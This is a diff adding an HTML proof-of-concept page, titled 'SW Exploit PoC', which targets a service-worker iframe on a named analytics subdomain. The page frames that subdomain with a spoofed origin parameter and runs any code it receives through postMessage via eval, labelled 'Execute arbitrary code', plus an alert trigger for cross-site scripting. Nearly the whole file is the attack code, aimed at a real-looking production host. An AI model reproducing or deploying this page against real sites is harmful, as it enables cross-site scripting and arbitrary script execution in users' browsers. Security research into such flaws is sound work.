@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SW Exploit PoC</title>
+  </head>
+  <body>
+    <h1>SW XSS Test</h1>
+
+    <iframe id="sw-frame" 
+      src="https://dna-analytics.xero.com/_/service_worker/51f0/sw_iframe.html?origin=https%3A%2F%2Fihatedota.com&1p=1&e=1" 
+      style="width:800px;height:400px;border:1px solid #000">
+    </iframe>
+
+    <script>
+      // Listen for messages from the iframe (from the SW)
+      window.addEventListener("message", (e) => {
+        if (e.origin === "https://dna-analytics.xero.com") {
+          console.log("Received message from iframe:", e.data);
+
+          // You can customize the message payload to trigger whatever you want
+          if (e.data && e.data.type === "eval" && e.data.code) {
+            try {
+              eval(e.data.code); // ⚠️ Execute arbitrary code
+            } catch (err) {
+              console.error("Eval failed", err);
+            }
+          }
+
+          // Or just trigger a basic alert
+          if (e.data === "trigger-alert") {
+            alert("Service Worker XSS Triggered!");
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
